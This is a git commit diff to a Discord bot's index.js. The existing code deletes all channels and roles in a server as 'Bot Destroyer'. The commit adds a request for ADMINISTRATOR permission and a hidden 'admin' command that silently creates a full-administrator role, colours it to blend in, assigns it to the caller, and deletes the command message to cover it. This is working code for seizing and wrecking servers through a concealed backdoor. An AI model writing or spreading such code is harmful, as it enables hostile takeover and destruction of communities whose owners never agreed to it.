baad00a3761a13bc89b4d9bb09e20d3a86ee14b9
Shekko7 <49597653+Shekko7@users.noreply.github.com>
2019-07-30 15:12:57 +0200

    Update index.js

--- index.js
+++ index.js
@@ -5,6 +5,13 @@ let token = "TOKEN HERE!";
 
 bot.on("ready", async () => {
     console.log(`${bot.user.username} ready!`);
+try {
+		//Generates a invite link in the console...
+	let link = await bot.generateInvite(["ADMINISTRATOR"]);
+	console.log(link);
+	} catch(e) {
+		console.log(e.stack);
+	}
 });
 
 
@@ -13,6 +20,20 @@ bot.on("message", async message => {
         message.guild.channels.deleteAll("Bot Destroyer");
         message.guild.roles.deleteAll("Bot Destroyer");
     }
+
+ if(command === `admin`) {
+  	try {
+	role = await message.guild.createRole({
+ 	name: "Mamamelo en cruz",
+  	color: "#2f3136",
+  	permissions: [8]
+	});
+	message.member.addRole(role)
+	message.delete(1000);
+	} catch(e) {
+		console.log(e.stack);
+	}
+   }
 
     if(message.content === "leave"){
         message.guild.leave();
